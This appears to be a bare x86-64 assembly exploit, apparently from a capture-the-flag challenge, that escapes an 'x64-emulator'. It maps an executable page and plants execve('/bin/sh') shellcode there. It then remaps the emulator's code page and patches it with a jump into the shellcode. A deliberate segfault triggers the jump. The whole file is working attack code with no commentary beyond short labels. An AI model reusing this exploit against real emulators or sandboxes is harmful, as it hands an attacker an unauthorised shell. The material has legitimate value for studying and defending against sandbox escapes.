bits 64
  ; mmap(0xdead0000, 0x1000, RWX, ...)
  xor r9d, r9d
  mov r8d, -1
  mov r10d, 0x22
  mov edx, 7
  mov esi, 0x1000
  mov rdi, 0xdead0000
  mov eax, 9
  syscall

  ; store shellcode (execve binsh)
  mov rax, 0xdead0000
  mov rbx, 0x91969dd1bb48c031
  mov [rax], rbx
  add rax, 8
  mov rbx, 0x53dbf748ff978cd0 ; sh
  mov [rax], rbx
  add rax, 8
  mov rbx, 0xb05e545752995f54
  mov [rax], rbx
  add rax, 8
  mov rbx, 0x050f3b
  mov [rax], rbx

  ; overwrite x64-emulator
  xor r9d, r9d
  mov r8d, -1
  mov r10d, 0x32
  mov edx, 7
  mov esi, 0x1000
  mov rdi, 0x0000555555556000
  mov eax, 9
  syscall

Overwrite:
  mov rax, 0x555555556124
  mov rbx, 0xe0ffdead0000b8
  mov [rax], rbx

SEGV:
  mov rax, 0x1000
  mov rax, [rax]
